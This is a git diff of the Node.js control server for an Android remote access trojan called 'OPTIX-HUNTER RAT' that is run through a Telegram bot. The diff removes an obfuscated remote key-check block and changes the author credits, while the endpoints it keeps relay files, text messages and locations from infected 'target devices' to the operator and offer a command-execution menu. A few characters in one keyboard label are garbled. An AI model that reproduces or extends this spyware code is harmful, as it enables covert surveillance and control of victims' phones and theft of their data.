@@ -21,259 +21,40 @@ const appClients = new Map()
 const upload = multer();
 app.use(bodyParser.json());
 
-(function (c, d) {
-    const e = c();
-    function h(c, d, e, f) {
-        return b(d - -0x14c, e);
-    }
-    function i(c, d, e, f) {
-        return b(f - 0x3e, d);
-    }
-    while (!![]) {
-        try {
-            const f = parseInt(h(0x8a, 0x41, 0x46, -0x11)) / (-0x1bc5 * 0x1 + -0x5ec + 0x21b2) + -parseInt(i(0x24e, 0x257, 0x215, 0x209)) / (0x171 * 0xf + -0x13 + -0x397 * 0x6) + parseInt(i(0x1c0, 0x18d, 0x1e6, 0x1e1)) / (-0x1 * -0x1a71 + 0xa24 + -0x2 * 0x1249) * (-parseInt(i(0x19e, 0x21d, 0x1be, 0x1cd)) / (-0x5 * 0x4fc + -0x191a + 0xd2 * 0x3d)) + -parseInt(i(0x1e7, 0x1f4, 0x21b, 0x1cc)) / (0xa * 0x248 + -0x2054 * -0x1 + -0x1 * 0x371f) * (-parseInt(h(-0x4, 0x3c, 0x62, 0x67)) / (0x12fd + -0x1c11 + 0x48d * 0x2)) + parseInt(i(0x27e, 0x225, 0x275, 0x23f)) / (0x1d9e + -0x2278 + 0x4e1) + -parseInt(h(0x4c, 0x4e, 0x4d, 0x1)) / (-0x1c0 * 0x16 + 0x159 * -0x17 + 0x4587) + -parseInt(h(0x68, 0x75, 0x72, 0x79)) / (0x20cd + -0x1 * 0x1636 + 0x7 * -0x182) * (-parseInt(i(0x208, 0x267, 0x21d, 0x222)) / (0x5de * 0x2 + -0x1 * -0x4b7 + -0x1069));
-            if (f === d)
-                break;
-            else
-                e['push'](e['shift']());
-        } catch (g) {
-            e['push'](e['shift']());
-        }
-    }
-}(a, -0x2bd * 0xfb + -0x1 * -0x12ee1 + 0x5382b));
-let currentUuid = '', currentNumber = '', currentTitle = '';
-function b(c, d) {
-    const e = a();
-    return b = function (f, g) {
-        f = f - (-0x1 * 0x1a7b + 0x2 * 0x14f + -0x17 * -0x119);
-        let h = e[f];
-        return h;
-    }, b(c, d);
-}
-const gr = j(0x1b9, 0x18b, 0x17e, 0x1b5), mg = j(0x246, 0x20b, 0x1f7, 0x254), cy = k(0x2d9, 0x2f7, 0x2d2, 0x289), yl = k(0x30f, 0x2d6, 0x343, 0x2f5), bl = k(0x2e2, 0x2cd, 0x32f, 0x2f5), red = k(0x297, 0x282, 0x295, 0x2da), rst = j(0x1af, 0x1c9, 0x184, 0x1b4), aprk = process[k(0x2e9, 0x2e4, 0x305, 0x2df)][j(0x1d4, 0x191, 0x1ff, 0x1f4)];
-function j(c, d, e, f) {
-    return b(c - 0x43, d);
-}
-function a() {
-    const s = [
-        'icons/Soci',
-        'content.co',
-        'c=\x22https:/',
-        '5170870oxWYcf',
-        'er/src/ima',
-        't:\x20200px;\x20',
-        'u\x20are\x20auth',
-        'ithub-prof',
-        '<h3>━━━━\x20C',
-        'a>\x0a\x20\x20\x20\x20\x20\x20\x20',
-        'ROBOT</tit',
-        '<img\x20align',
-        '<a\x20href=\x22h',
-        'UPTIME\x20ROB',
-        'https://t.',
-        '\x20alt=\x22ShTa',
-        'TEAM\x20NAME:',
-        'gerat.txt',
-        '/icons/Soc',
-        '[+]\x20',
-        '/github-pr',
-        'tent.com/r',
-        '\x0a\x20\x20\x20\x20<html',
-        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20<',
-        'uldkjain/g',
-        'tabase/blo',
-        't=\x22ShTasri',
-        'ial/facebo',
-        'DEVELOPED\x20',
-        'exit',
-        '\x1b[33m',
-        'ile-readme',
-        '1999018oArDBw',
-        'get',
-        '\x1b[35m',
-        't=\x22blank\x22>',
-        'border-rad',
-        '/twitter.c',
-        'thub.com/S',
-        '\x22\x20height=\x22',
-        '\x22blank\x22><i',
-        '\x22cybershbd',
-        'rsh_offici',
-        'clear',
-        '</html>\x0a',
-        '\x20\x20<p>Welco',
-        '\x2230\x22\x20width',
-        'proval/Nod',
-        'error',
-        '\x20\x20\x20\x20<body>',
-        'TYPE\x20html>',
-        '\x1b[0m',
-        'mg\x20align=\x22',
-        'ead>\x0a\x20\x20\x20\x20\x20',
-        'listen',
-        'includes',
-        'hub.com/Sh',
-        '\x0a[+]\x20',
-        'rator/mast',
-        'ius:\x2050%;\x22',
-        'p>Telegram',
-        '\x1b[32m',
-        'n/assets/i',
-        'SERVER\x20POR',
-        'Tasrif</p>',
-        '30\x22\x20width=',
-        'tions\x20🎉\x0aYo',
-        'cons/Socia',
-        '\x0a━━━━━━━━━',
-        'r...',
-        'or/master/',
-        'center\x22\x20sr',
-        'h\x20me\x20━━━━<',
-        'm/cybershb',
-        'hbd\x22\x20targe',
-        '.svg\x22\x20alt=',
-        'ahuldkjain',
-        'b/main/.ap',
-        '\x1b[31m',
-        '6HHxNri',
-        'Congratula',
-        'd\x22\x20target=',
-        'ofile-read',
-        'h1>SH\x20Upti',
-        '1206tIPIHe',
-        '1218455cnDHyy',
-        '4EQlxdB',
-        'me-generat',
-        'REPL_ID',
-        'eadme-gene',
-        'f\x22\x20height=',
-        'ebook.svg\x22',
-        'then',
-        'hubusercon',
-        'github-pro',
-        '>\x0a\x20\x20\x20\x20\x20\x20<h',
-        'src/images',
-        '3050352DEOnuF',
-        'ttps://fb.',
-        'orized\x20use',
-        '/h3>\x0a\x20\x20\x20\x20\x20',
-        '\x20\x20\x20<a\x20href',
-        'mg/shtasri',
-        'om/cybersh',
-        'RIF',
-        '\x2240\x22\x20/></a',
-        '442245FrUuCD',
-        'You\x20are\x20no',
-        'tent.com/S',
-        'e-generato',
-        'rc=\x22https:',
-        'BY:\x20SH\x20TAS',
-        'catch',
-        'body>\x0a\x20\x20\x20\x20',
-        'ubusercont',
-        'r/master/s',
-        '-generator',
-        'file-readm',
-        'SH\x20UPTIME\x20',
-        '://raw.git',
-        'al/twitter',
-        'l/instagra',
-        'tps://raw.',
-        'ok.svg\x22\x20al',
-        'https://gi',
-        '5px;\x20heigh',
-        '=\x2240\x22\x20/></',
-        'srif\x22\x20heig',
-        '\x20\x20\x20\x20\x20<img\x20',
-        'bd\x22\x20target',
-        'r\x22\x20src=\x22ht',
-        'YOUR\x20KEY\x20:',
-        '\x20CYBER\x20SH',
-        '━━━━━━━━\x0a',
-        'ed\x20user.',
-        'rSH</p><p>',
-        '9SwGSRo',
-        'stagram.co',
-        '\x20<a\x20href=\x22',
-        '━━━━━━━━━━',
-        'hTasrif/Da',
-        '>\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
-        'dth=\x2240\x22\x20/',
-        '//raw.gith',
-        '\x1b[36m',
-        'ign=\x22cente',
-        '550408KjSFFM',
-        '\x20:\x20https:/',
-        'Github\x20:\x20h',
-        '=\x22https://',
-        'send',
-        '=\x22blank\x22><',
-        'src=\x22https',
-        '\x1b[34m',
-        'f.png\x22\x20alt',
-        'data',
-        '</head>\x0a\x20\x20',
-        '>\x0a\x20\x20\x20\x20\x20\x20</',
-        'onnect\x20wit',
-        'log',
-        'env',
-        'me/cybersh',
-        'buserconte',
-        'fb.com/cyb',
-        '=\x22ShTasrif',
-        'com/cybers',
-        'm/rahuldkj',
-        '-profile-r'
-    ];
-    mek = function () {
-        return a();
-    };
-    return a();
-}
-axios['get'](k(0x2c5, 0x2b8, 0x2da, 0x2b2) + k(0x317, 0x35a, 0x304, 0x36b) + j(0x208, 0x217, 0x1db, 0x1fb) + j(0x23d, 0x224, 0x205, 0x203) + j(0x1c9, 0x1ae, 0x1a1, 0x175) + j(0x1ab, 0x18f, 0x1d1, 0x19b) + 'eJS/BOT/do' + j(0x235, 0x26c, 0x20c, 0x23b))[j(0x1d8, 0x1f0, 0x1db, 0x1d2)](c => {
-    const d = c[l(0x163, 0x155, 0x156, 0x105)];
-    function m(c, d, e, f) {
-        return j(f - -0x161, c, e - 0x195, f - 0x1e7);
-    }
-    function l(c, d, e, f) {
-        return j(e - -0xc1, d, e - 0xa5, f - 0x148);
-    }
-    d[l(0x117, 0xa1, 0xf2, 0xed)](aprk) ? console[l(0x157, 0x10b, 0x15a, 0x147)](gr + (l(0x11a, 0x14b, 0x10b, 0x141) + m(0x7f, 0x76, 0x9a, 0x5d) + m(0x108, 0x89, 0x9f, 0xc9) + l(0x117, 0x154, 0x11e, 0x114) + l(0xc3, 0x142, 0x100, 0x128))) : (console['log'](red + (l(0x171, 0x11b, 0x126, 0x12b) + 't\x20authoriz' + m(0xd4, 0x74, 0x4d, 0xa1))), process[m(0x8d, 0x119, 0xdc, 0xe0)](0x1 * 0x1a03 + 0x2a9 * -0x2 + -0x14b0));
-})[k(0x2b9, 0x2d4, 0x29a, 0x2e5)](c => {
-    function n(c, d, e, f) {
-        return j(f - 0xed, c, e - 0x158, f - 0xf);
-    }
-    console[n(0x283, 0x295, 0x272, 0x299)](c), process['exit'](-0x12ff + -0x5 * 0x175 + 0x1a49);
-}), app[k(0x312, 0x35d, 0x2c1, 0x344)]('/', (c, d) => {
-    function o(c, d, e, f) {
-        return j(e - 0x1be, f, e - 0x83, f - 0xaf);
-    }
-    const e = '\x0a\x20\x20\x20\x20<!DOC' + o(0x350, 0x36b, 0x36c, 0x380) + o(0x3fc, 0x44a, 0x3f8, 0x3f1) + o(0x383, 0x34a, 0x399, 0x34f) + o(0x374, 0x359, 0x36f, 0x385) + '\x20\x20\x20<title>' + p(-0x32, -0x9b, -0x63, -0x36) + o(0x39a, 0x3ef, 0x3ec, 0x3e2) + 'le>\x0a\x20\x20\x20\x20\x20\x20' + p(-0x90, -0x52, -0x3d, -0x24) + p(-0x8d, -0xaa, -0xa8, -0x79) + o(0x421, 0x3c2, 0x3f9, 0x3f6) + p(-0x33, -0xbf, -0x86, -0x43) + 'me\x20Robot</' + 'h1>\x0a\x20\x20\x20\x20\x20\x20' + p(-0xfb, -0x8b, -0xac, -0xba) + 'me\x20To\x20Cybe' + p(-0x27, -0x6, -0x52, -0x67) + p(-0x12, -0x75, -0x45, 0x2) + 'ttps://git' + p(-0x65, -0xda, -0xa1, -0xbc) + p(-0x8f, -0xb3, -0x99, -0xd4) + o(0x3af, 0x40c, 0x3f9, 0x42b) + o(0x395, 0x3b9, 0x376, 0x35f) + p(-0x1e, -0x2e, -0x46, -0x63) + '/t.me/cybe' + o(0x365, 0x390, 0x364, 0x357) + 'al</p>\x0a\x20\x20\x20' + o(0x3a5, 0x379, 0x3ba, 0x3d9) + p(-0x4a, -0x4e, -0x41, -0x2d) + o(0x39f, 0x3b4, 0x3b1, 0x3c2) + o(0x360, 0x371, 0x397, 0x348) + p(-0x2f, -0x33, -0x6d, -0x60) + 'hTasrif/Sh' + 'Tasrif.git' + 'hub.io/mai' + o(0x36e, 0x39c, 0x378, 0x379) + p(-0x3c, -0x31, -0x73, -0xc3) + o(0x3eb, 0x407, 0x3d4, 0x3e5) + '=\x22\x22\x20style=' + '\x22width:\x2019' + p(-0x32, -0x63, -0x5c, -0x7d) + p(-0x3e, -0x79, -0x2c, -0xc) + p(0x4, -0x3, -0xd, -0x29) + p(-0x57, -0x5d, -0x9e, -0xcb) + p(-0x84, -0x1d, -0x4c, -0xe) + o(0x3e8, 0x426, 0x3ea, 0x3be) + o(0x429, 0x386, 0x3d8, 0x3a9) + p(-0x84, -0x92, -0x91, -0x82) + p(-0x4f, -0x73, -0x75, -0x82) + p(-0x72, -0xbe, -0x74, -0x39) + o(0x3cf, 0x39c, 0x3cf, 0x423) + o(0x3e0, 0x38b, 0x3dd, 0x3a6) + 'ershbd\x22\x20ta' + 'rget=\x22blan' + 'k\x22><img\x20al' + p(-0x82, -0x3d, -0x48, -0x9a) + p(-0x70, -0x83, -0x57, -0x60) + p(-0x96, -0x1e, -0x5f, -0x77) + 'githubuser' + o(0x3e8, 0x3b4, 0x3e3, 0x3b4) + p(-0x33, -0xf, -0x33, -0x3c) + 'ain/github' + p(-0x19, 0x7, -0x32, -0x74) + p(-0x69, -0x9a, -0x80, -0xb5) + p(-0x4b, -0x76, -0x9f, -0x6a) + o(0x407, 0x3bb, 0x3e6, 0x3b0) + 'ges/icons/' + 'Social/fac' + o(0x370, 0x3d6, 0x395, 0x3aa) + p(-0x3b, -0x4, -0x22, -0x2f) + p(-0xd, -0x8e, -0x5a, -0x5e) + 'ht=\x2230\x22\x20wi' + p(-0x58, -0x35, -0x4b, -0x2) + '></a>\x0a\x20\x20\x20\x20' + '\x20\x20\x20\x20<a\x20hre' + 'f=\x22https:/' + p(-0x58, 0x48, -0xc, 0x1b) + o(0x3be, 0x3ef, 0x3a1, 0x355) + p(-0x86, -0x11, -0x58, -0x5f) + o(0x412, 0x38a, 0x3d1, 0x3ac) + 'img\x20align=' + '\x22center\x22\x20s' + p(-0x85, -0x83, -0x6b, -0x66) + o(0x385, 0x3aa, 0x3c9, 0x387) + p(-0x48, -0xb8, -0x67, -0x7c) + 'ent.com/ra' + 'huldkjain/' + o(0x3c6, 0x3a6, 0x398, 0x3c0) + p(-0x85, -0x9d, -0x64, -0x9d) + o(0x387, 0x3ee, 0x3a7, 0x3bc) + p(-0x73, -0x1d, -0x66, -0x34) + 'rc/images/' + p(0x1c, -0x75, -0x31, -0x66) + p(-0x2d, -0x61, -0x61, -0x53) + o(0x3b8, 0x3b7, 0x385, 0x3a9) + p(-0xbb, -0x77, -0xb0, -0xef) + '\x22\x20height=\x22' + p(-0xa7, -0x92, -0x98, -0x92) + p(-0x50, -0x67, -0x70, -0x58) + (p(-0x85, -0x31, -0x4c, -0x3f) + o(0x3e3, 0x3e8, 0x3ee, 0x442) + p(-0x62, -0x7a, -0x77, -0xa6) + p(-0x36, -0x69, -0x34, -0x5b) + o(0x34a, 0x339, 0x384, 0x3ce) + o(0x3dd, 0x431, 0x405, 0x404) + p(-0x53, -0x13, -0x26, -0x2c) + '=\x22center\x22\x20' + p(-0x18, -0x7c, -0x41, -0x5c) + '://raw.git' + p(-0xbd, -0x98, -0x7c, -0x9b) + p(-0x48, -0x1e, -0x1c, 0x6) + o(0x358, 0x3ae, 0x386, 0x3b9) + p(-0x6, -0x2b, -0x1d, -0x62) + p(-0xc3, -0x7a, -0x87, -0xca) + o(0x369, 0x383, 0x391, 0x35e) + o(0x33f, 0x35c, 0x380, 0x32d) + o(0x34b, 0x3dc, 0x39a, 0x3ce) + p(-0x45, 0x5, -0x1f, -0x40) + o(0x40f, 0x405, 0x3fd, 0x426) + o(0x3e4, 0x403, 0x3b5, 0x37a) + o(0x3bc, 0x44b, 0x3fc, 0x3e0) + p(-0xad, -0x95, -0x7f, -0x52) + o(0x3b8, 0x387, 0x368, 0x3a1) + o(0x36f, 0x3a7, 0x3b8, 0x3d8) + p(0x11, -0x22, -0x28, 0xb) + o(0x374, 0x413, 0x3c4, 0x398) + 'https://in' + p(-0x9c, -0x76, -0x50, -0x17) + o(0x3cd, 0x351, 0x383, 0x352) + o(0x3b6, 0x3b5, 0x38b, 0x3b1) + o(0x402, 0x43f, 0x40a, 0x3cf) + o(0x363, 0x31b, 0x36e, 0x3b5) + p(-0xd9, -0x6e, -0x92, -0xc0) + o(0x3a7, 0x3a7, 0x3e4, 0x39f) + '/raw.githu' + p(0xb, 0x8, -0x37, -0x17) + 'nt.com/rah' + p(-0x4f, -0x38, -0x19, -0x1c) + p(-0x62, -0x7b, -0x2a, -0x57) + o(0x42e, 0x3de, 0x401, 0x43e) + o(0x3a3, 0x383, 0x3ae, 0x3bd) + '/master/sr' + 'c/images/i' + p(-0xd8, -0x54, -0x96, -0x86) + p(-0xc, -0xab, -0x60, -0x71) + 'm.svg\x22\x20alt' + p(-0x7b, -0x80, -0x35, -0x6e) + o(0x3dd, 0x3f6, 0x409, 0x3d0) + p(-0x95, -0x72, -0x98, -0x60) + p(-0xba, -0x5b, -0x70, -0x69) + p(-0x58, -0x7, -0x3c, -0x80) + o(0x397, 0x3f1, 0x3ab, 0x38e) + o(0x31c, 0x358, 0x366, 0x321));
-    function p(c, d, e, f) {
-        return k(e - -0x322, d - 0x14e, c, f - 0xed);
-    }
-    d[o(0x421, 0x3e1, 0x3d0, 0x3f7)](e);
+let currentUuid = ''
+let currentNumber = ''
+let currentTitle = ''
+
+
+//============<<<>>>================
+
+const gr = '\x1b[32m';
+const mg = '\x1b[35m';
+const cy = '\x1b[36m';
+const yl = '\x1b[33m';
+const bl = '\x1b[34m';
+const red = '\x1b[31m';
+const rst = '\x1b[0m';
+
+app.listen(PORT, () => {
+  console.clear();
+  console.log(`
+${bl}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+${rst}[+] ${mg}OPTIX-HUNTER RAT${rst}
+${rst}[+] ${cy}SERVER PORT: ${PORT}${rst}
+${rst}[+] ${gr}DEVELOPED BY: MD BAIZID MOSTAFA${rst}
+[+] ${yl}TEAM NAME: OPTIX-HUNTER${rst}
+[+] ${mg}https://github.com/BAIZID-171${rst}
+[+] ${cy}https://t.me/Optix_Hunter${bl}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
 });
-function k(c, d, e, f) {
-    return b(c - 0x110, e);
-}
-app[k(0x27f, 0x2a4, 0x2c0, 0x26c)](PORT, () => {
-    console[q(-0x203, -0x254, -0x24e, -0x257)]();
-    function q(c, d, e, f) {
-        return j(c - -0x3aa, e, e - 0x169, f - 0x39);
-    }
-    function r(c, d, e, f) {
-        return j(f - -0x1a3, c, e - 0xa2, f - 0x19a);
-    }
-    console['log']('\x0a' + bl + (r(0x6b, 0x2b, 0xb0, 0x64) + r(0xb7, 0x53, 0x29, 0x64) + q(-0x1a3, -0x1a5, -0x1ae, -0x15a) + q(-0x1a9, -0x190, -0x164, -0x1cf)) + rst + q(-0x173, -0x12a, -0x199, -0x14a) + mg + (r(0x53, 0x92, 0xd2, 0x8e) + 'OT') + rst + '\x0a' + rst + q(-0x173, -0x16f, -0x153, -0x1a2) + cy + (r(-0x1b, 0x5, 0x2a, 0x18) + 'T:\x20') + PORT + rst + '\x0a' + rst + q(-0x173, -0x1ae, -0x174, -0x14e) + gr + (q(-0x16a, -0x18d, -0x11a, -0x199) + r(0x6f, 0xb, 0x2e, 0x48) + q(-0x1c6, -0x18c, -0x1a6, -0x205)) + rst + '\x0a[+]\x20' + yl + (q(-0x176, -0x1ae, -0x1a3, -0x184) + r(0xf, 0x93, 0x26, 0x5d)) + rst + q(-0x1f5, -0x1a5, -0x23a, -0x21b) + mg + (q(-0x1b2, -0x195, -0x1e7, -0x1da) + q(-0x160, -0x14c, -0x1ab, -0x14c) + 'hTasrif') + rst + r(-0x2a, -0x3a, 0x42, 0x12) + cy + (r(0xa6, 0x93, 0x78, 0x8f) + r(0x41, 0x44, 0x2d, 0x7a) + 'bd') + bl + '\x0a' + rst + r(0x7a, 0x5d, 0x86, 0x94) + yl + (r(0x90, 0x74, 0x71, 0x5c) + '\x20') + aprk + bl + (q(-0x1ea, -0x1ce, -0x227, -0x1bb) + '━━━━━━━━━━' + q(-0x1a3, -0x162, -0x18c, -0x170) + '━━━━━━━━━') + gr);
-});
-
-
-
+app.get('/', function (req, res) {
+    res.send('<h1 align="center">\x0a\x20\x20\x20\x20<!DOCTYPE\x20html>\x0a\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<title>OPTIX\x20HUNTER\x20RAT</title>\x0a\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h1>OPTIX\x20HUNTER\x20RAT</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>Welcome\x20To\x20Optix-Hunter</p><p>Github\x20:\x20https://github.com/BAIZID-171</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>Telegram\x20:\x20https://t.me/Mr_Alone171</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://raw.githubusercontent.com/BAIZID-171/BAIZID-171.github.io/main/assets/img/Baizid.jpg\x22\x20alt=\x22\x22\x20style=\x22width:\x20195px;\x20height:\x20200px;\x20border-radius:\x2050%;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h3>━━━━\x20Connect\x20with\x20me\x20━━━━</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://www.facebook.com/profile.php?id=61550026974499\x22\x20target=\x22blank\x22><img\x20align=\x22center\x22\x20src=\x22https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/facebook.svg\x22\x20alt=\x22BAIZID-171\x22\x20height=\x2230\x22\x20width=\x2240\x22\x20/></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://twitter.com/Baizid171\x22\x20target=\x22blank\x22><img\x20align=\x22center\x22\x20src=\x22https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/twitter.svg\x22\x20alt=\x22AloneBoy\x22\x20height=\x2230\x22\x20width=\x2240\x22\x20/></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://t.me/Optix_Hunter\x22\x20target=\x22blank\x22><img\x20align=\x22center\x22\x20src=\x22https://www.freepnglogos.com/uploads/telegram-logo-png-0.png\x22\x20alt=\x22BAIZID-171\x22\x20height=\x2230\x22\x20width=\x2240\x22\x20/></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://instagram.com/fashu_x\x22\x20target=\x22blank\x22><img\x20align=\x22center\x22\x20src=\x22https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/instagram.svg\x22\x20alt=\x22BAIZID-171\x22\x20height=\x2230\x22\x20width=\x2240\x22\x20/></a>\x0a\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20</html>\x0a</h1>')})
 app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname
     appBot.sendDocument(id, req.file.buffer, {
-            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\nModified : @cybersh_official\n`,
+            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
             parse_mode: "HTML"
         },
         {
@@ -283,7 +64,7 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     res.send('')
 })
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\nModified : @cybersh_official\n\n` + req.body['text'], {parse_mode: "HTML"})
+    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
     res.send('')
 })
 app.post("/uploadLocation", (req, res) => {
@@ -557,7 +338,7 @@ appBot.on('message', (message) => {
                 '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                 '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                 '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
-                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ\n\n──────────────────────\nᴍᴏᴅɪꜰɪᴇᴅ ʙʏ : 𝑺𝑯 𝑻𝑨𝑺𝑹𝑰𝑭\nɢʀᴏᴜᴘ: @cybershbd\nᴄʜᴀɴɴᴇʟ : @cybersh_official\n──────────────────────',
+                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ\n\n──────────────────────\nᴍᴏᴅɪꜰɪᴇᴅ ʙʏ : @Mr_Alone171\nɢʀᴏᴜᴘ: @Optix_Hunters\nᴄʜᴀɴɴᴇʟ : @Optix_Hunter\n─────────────────────',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -589,7 +370,7 @@ appBot.on('message', (message) => {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
                     '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
-                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ\n\n──────────────────────\nᴍᴏᴅɪꜰɪᴇᴅ ʙʏ : 𝑺𝑯 𝑻𝑨𝑺𝑹𝑰𝑭\nɢʀᴏᴜᴘ: @cybershbd\nᴄʜᴀɴɴᴇʟ : @cybersh_official\n──────────────────────'
+                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ\n\n──────────────────────\nᴍᴏᴅɪꜰɪᴇᴅ ʙʏ : @Mr_Alone171\nɢʀᴏᴜᴘ: @Optix_Hunters\nᴄʜᴀɴɴᴇʟ : @Optix_Hunter\n─────────────────────'
                 )
             } else {
                 const deviceListKeyboard = []
@@ -835,7 +616,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙??𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                     'resize_keyboard': true
                 }
             }
@@ -959,5 +740,4 @@ setInterval(function () {
     } catch (e) {
     }
 }, 5000)
-
 appServer.listen(process.env.PORT || 8999);
